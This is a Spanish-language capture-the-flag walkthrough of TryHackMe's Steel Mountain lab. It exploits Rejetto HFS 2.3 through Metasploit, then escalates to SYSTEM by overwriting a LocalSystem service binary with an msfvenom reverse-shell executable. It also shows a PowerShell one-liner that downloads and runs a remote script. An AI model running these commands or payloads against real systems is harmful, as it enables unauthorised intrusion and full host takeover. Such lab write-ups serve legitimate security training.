## 🧠 Información General – Steel Mountain

| Campo            | Detalle |
|------------------|--------|
| Plataforma       | TryHackMe |
| Sistema objetivo | Windows Server 2012 R2 |
| Sistema atacante | Kali Linux |
| Dificultad       | Intermedio |
| Tipo de exploit  | Remote Command Execution (RCE) + Privilege Escalation |
# 🔍 1. Enumeración inicial

## Escaneo con Nmap

Se realiza un escaneo completo de puertos y servicios:

nmap -Pn -sV -p- 10.130.181.44

### 📊 Resultado relevante

PORT      STATE SERVICE       VERSION  
80/tcp    open  http          Microsoft IIS httpd 8.5  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds  
3389/tcp  open  ms-wbt-server Microsoft Terminal Services  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
8080/tcp  open  http          HttpFileServer httpd 2.3

---

## 📌 Identificación del servicio vulnerable

El puerto más relevante es:

8080 → HttpFileServer httpd 2.3

👉 Este servicio corresponde a:

**Rejetto HTTP File Server (HFS)**

---

# 🔎 2. Búsqueda de exploit

searchsploit "HttpFileServer 2.3"

### Resultado:

Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)

---

# 💣 3. Explotación inicial

## Uso de Metasploit

use exploit/windows/http/rejetto_hfs_exec  
set RHOSTS 10.130.181.44  
set LHOST 192.168.130.29  
run

---

## 💥 Resultado obtenido

[*] Meterpreter session 1 opened (192.168.130.29:4444 -> 10.130.181.44:49335)

---

## 🔎 Información del sistema

meterpreter > sysinfo

Computer        : STEELMOUNTAIN  
OS              : Windows Server 2012 R2 (6.3 Build 9600).  
Architecture    : x64  
Meterpreter     : x86/windows

---

# 🔎 4. Enumeración del sistema

## Usuario actual

meterpreter > getuid

Server username: bill

---

## Procesos activos

meterpreter > ps

👉 Se identifica:

AdvancedSystemCareService9.exe

---

# 🔍 5. Enumeración del servicio

Se accede a una shell:

meterpreter > shell

---

## Consulta del servicio

sc query AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9   
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)  
        STATE              : 4  RUNNING 

---

## Configuración del servicio

sc qc AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9  
  
BINARY_PATH_NAME   : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe  
SERVICE_START_NAME : LocalSystem

---

# ⚠️ 6. Identificación de vulnerabilidad

👉 Puntos clave:

- Servicio ejecutado como:

LocalSystem

- Ruta vulnerable:

C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe

👉 Vulnerabilidad:

✔ Permisos débiles sobre el binario  
✔ Posible reemplazo del ejecutable

---

# 💣 7. Generación de payload

En Kali:

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.130.29 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o /home/carlos/Advanced.exe

---

# 📤 8. Subida del payload

meterpreter > upload /home/carlos/Advanced.exe ASCService.exe

[*] Uploading  : /home/carlos/Advanced.exe -> ASCService.exe  
[*] Uploaded 7.00 KiB of 7.00 KiB (100.0%)  
[*] Completed

---

# 🎧 9. Preparación del listener

nc -lvnp 4443

---

# 🔄 10. Ejecución del exploit

En la víctima:

sc stop AdvancedSystemCareService9  
sc start AdvancedSystemCareService9

---

# 💥 11. Escalada de privilegios

En Kali:

whoami

nt authority\system

👉 Acceso como administrador conseguido

---

# 🏁 12. Obtención de flags

## 📄 Root flag

cd C:\Users\Administrator\Desktop  
type root.txt

---

## 📄 User flag

cd C:\Users\bill\Desktop  
type user.txt

---

# 🔁 13. Parte sin Metasploit

## Enumeración manual

powershell -c "Get-WmiObject win32_service"

---

## Uso de winPEAS

powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://TU_IP/winPEAS.ps1')"

---

## Identificación del servicio vulnerable

AdvancedSystemCareService9

---

## Explotación manual

1. Descargar payload con PowerShell
2. Reemplazar binario
3. Reiniciar servicio